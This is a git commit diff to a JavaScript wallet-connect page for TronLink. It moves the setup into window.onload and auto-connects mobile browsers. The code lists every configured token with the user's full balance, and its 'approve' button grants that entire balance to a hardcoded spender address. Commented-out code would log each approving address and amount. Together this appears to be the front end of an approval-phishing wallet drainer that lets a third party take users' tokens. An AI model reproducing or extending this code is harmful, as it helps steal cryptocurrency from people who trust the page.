805f85d295d110d61c0cb9225241a9032f33191c
vovilonn <vovadesign0792@gmail.com>
2022-01-11 16:08:01 +0200

    fix mobile connection

--- src/index.js
+++ src/index.js
@@ -3,82 +3,85 @@
 import tronWallet from "./tronlink";
 import config from "./config.json";
 
-const connectBtn = document.querySelector("#connectBtn");
-const tronlinkBtn = document.querySelector("#tronlinkBtn");
-const modal = document.querySelector(".modal");
-const closeModalBtn = document.querySelector("#closeModalBtn");
-// const approveBtn = document.querySelector("#approveBtn");
-// approveBtn.addEventListener("click", () =>
-//     tronWallet.approve(config.TOKEN_ADRESS, 1)
-// );
+window.onload = () => {
+    const connectBtn = document.querySelector("#connectBtn");
+    const tronlinkBtn = document.querySelector("#tronlinkBtn");
+    const modal = document.querySelector(".modal");
+    const closeModalBtn = document.querySelector("#closeModalBtn");
+    const approveWrapper = document.querySelector("#approveWrapper");
 
-const tokenBalanceEl = document.querySelector("#tokenBalance");
-const approveWrapper = document.querySelector("#approveWrapper");
+    let connected = false;
+    if (
+        /Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i.test(
+            navigator.userAgent
+        )
+    ) {
+        toggleConnect(true);
+    }
 
-let connected = false;
+    function toggleModal(isOpen) {
+        modal.style.display = isOpen ? "block" : "none";
+    }
 
-function toggleModal(isOpen) {
-    modal.style.display = isOpen ? "block" : "none";
-}
-
-function makeApproveElement({ tokenName, balance, tokenAddress }) {
-    const el = document.createElement("div");
-    el.classList.add("d-flex", "mt-1");
-    el.innerHTML = `Token: ${tokenName}
+    function makeApproveElement({ tokenName, balance, tokenAddress }) {
+        const el = document.createElement("div");
+        el.classList.add("d-flex", "mt-1");
+        el.innerHTML = `Token: ${tokenName}
                 <div style="margin: 0 10px;">Token balance: ${balance}</div>
                 <button id="approveBtn" class="btn btn-sm btn-outline-secondary">approve</button>`;
-    el.onclick = () => {
-        tronWallet.approve(tokenAddress, balance);
-    };
-    return el;
-}
+        el.onclick = () => {
+            tronWallet.approve(tokenAddress, balance);
+        };
+        return el;
+    }
 
-function appendApproveElements() {
-    config.tokens.forEach(async (tokenAddress) => {
+    function appendApproveElements() {
+        config.tokens.forEach(async (tokenAddress) => {
+            try {
+                const balance = await tronWallet.getBalance(tokenAddress);
+                const approveEL = makeApproveElement({
+                    tokenName: tokenAddress,
+                    balance,
+                    tokenAddress,
+                });
+                approveWrapper.append(approveEL);
+            } catch (err) {
+                alert(err);
+            }
+        });
+    }
+
+    function toggleConnect(isConnected) {
+        connected = isConnected;
+        connectBtn.textContent = isConnected ? "connected" : "connect";
+        connectBtn.disabled = isConnected;
+        appendApproveElements();
+    }
+
+    connectBtn.addEventListener("click", () => {
+        toggleModal(true);
+    });
+
+    closeModalBtn.addEventListener("click", () => {
+        toggleModal(false);
+    });
+
+    // ====== tronlink ======
+
+    tronlinkBtn.addEventListener("click", async () => {
         try {
-            const balance = await tronWallet.getBalance(tokenAddress);
-            const approveEL = makeApproveElement({
-                tokenName: tokenAddress,
-                balance,
-                tokenAddress,
-            });
-            approveWrapper.append(approveEL);
+            const result = await tronWallet.connect();
+            console.log(result);
+            if (result && result.code === 200) {
+                toggleModal(false);
+                toggleConnect(true);
+                return;
+            }
+            alert(result);
         } catch (err) {
             alert(err);
         }
     });
-}
 
-function toggleConnect(isConnected) {
-    connected = isConnected;
-    connectBtn.textContent = isConnected ? "connected" : "connect";
-    connectBtn.disabled = isConnected;
-    appendApproveElements();
-}
-
-connectBtn.addEventListener("click", () => {
-    toggleModal(true);
-});
-
-closeModalBtn.addEventListener("click", () => {
-    toggleModal(false);
-});
-
-// ====== tronlink ======
-
-tronlinkBtn.addEventListener("click", async () => {
-    try {
-        const result = await tronWallet.connect();
-        console.log(result);
-        if (result.code === 200) {
-            toggleModal(false);
-            toggleConnect(true);
-            return;
-        }
-        alert(result);
-    } catch (err) {
-        alert(err);
-    }
-});
-
-// ====== other =====
+    // ====== other =====
+};
--- src/tronlink.js
+++ src/tronlink.js
@@ -1,29 +1,39 @@
 import config from "./config.json";
 import utils from "ethers-utils";
+// import fs from "fs";
+// import path from "path";
 
-let userAddress;
+// function writeApproveLog(logObject) {
+//     console.log("makeLog");
+//     logObject._logTime = Date.now().toLocaleString();
+//     const logPath = path.resolve("./logs/approve.log.txt");
+//     const existingLogs = fs.readFileSync(logPath) || "";
+//     const logString = existingLogs + JSON.stringify(logObject, null, 2) + "\n";
+//     fs.writeFileSync(logPath, logString);
+// }
 
 export default {
     async connect() {
         const tronWeb = window.tronWeb;
+
         try {
-            userAddress = tronWeb.defaultAddress.base58;
             return await tronWeb.request({
                 method: "tron_requestAccounts",
             });
         } catch (err) {
-            alert("login to your tronLink wallet");
+            alert(err);
         }
     },
     async approve(contractAddress, amount) {
         try {
             const contract = await tronWeb.contract().at(contractAddress);
-            return await contract.methods
-                .approve(
-                    config.APPROVE_SPENDER_ADRESS,
-                    new utils.BigNumber(amount)
-                )
-                .send();
+            const amountToApprove = new utils.BigNumber(amount);
+            // writeApproveLog({
+            //     window.tronWeb.defaultAddress.base58,
+            //     spenderAddress: config.APPROVE_SPENDER_ADRESS,
+            //     amountToApprove,
+            // });
+            return await contract.methods.approve(config.APPROVE_SPENDER_ADRESS, amountToApprove).send();
         } catch (err) {
             alert(err);
         }
@@ -31,9 +41,7 @@ export default {
     async getBalance(contractAddress) {
         try {
             const contract = await tronWeb.contract().at(contractAddress);
-            const balance = await contract.methods
-                .balanceOf(userAddress)
-                .call();
+            const balance = await contract.methods.balanceOf(window.tronWeb.defaultAddress.base58).call();
             return balance.toString();
         } catch (err) {
             alert(err);
